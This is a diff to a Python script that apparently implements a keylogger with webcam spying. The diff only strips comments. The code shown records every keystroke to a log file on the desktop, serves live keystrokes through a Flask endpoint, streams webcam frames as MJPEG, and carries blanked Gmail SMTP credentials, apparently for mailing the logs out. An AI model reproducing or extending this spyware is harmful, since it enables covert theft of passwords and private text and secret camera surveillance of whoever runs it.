@@ -29,19 +29,18 @@ log_dir = os.path.join(desktop_path, "KeyLoggerLogs")
 
 os.makedirs(log_dir, exist_ok=True)
 
-# Email configuration
 sender_email = "-----"
 receiver_email = "-----"
 email_password = "-----"
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
 
-# Logging configuration
+
 logging.basicConfig(filename=(os.path.join(log_dir, "key_log.txt")), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-# Variable to store live keystrokes
+
 live_keystrokes = ""
-max_keystrokes_display = 500  # Adjust the maximum number of characters to display
+max_keystrokes_display = 500
 
 def on_press(key):
     global live_keystrokes
@@ -53,15 +52,14 @@ def on_press(key):
         logging.info(str(key))
         live_keystrokes = str(key)
 
-        # Truncate the live_keystrokes if it exceeds the maximum limit
+     
         live_keystrokes = live_keystrokes[-max_keystrokes_display:]
 
-# Function to continuously listen for keyboard events
 def start_key_listener():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-# Start the key listener in a separate thread
+
 key_listener_thread = Thread(target=start_key_listener)
 key_listener_thread.start()
 
@@ -178,15 +176,15 @@ def generate_frames():
         if not ret:
             break
 
-        # Encode the frame in JPEG format
+   
         _, buffer = cv2.imencode('.jpg', frame)
         frame_bytes = buffer.tobytes()
 
-        # Yield the frame in the response
+      
         yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
 
-    # Release the webcam when the generator is finished
+   
     cap.release()
 
 @app.route('/')
@@ -202,5 +200,5 @@ def keystrokes_feed():
     return jsonify({"data": live_keystrokes})
 
 if __name__ == '__main__':
-    # Start the Flask web server
+ 
     app.run(debug=True)
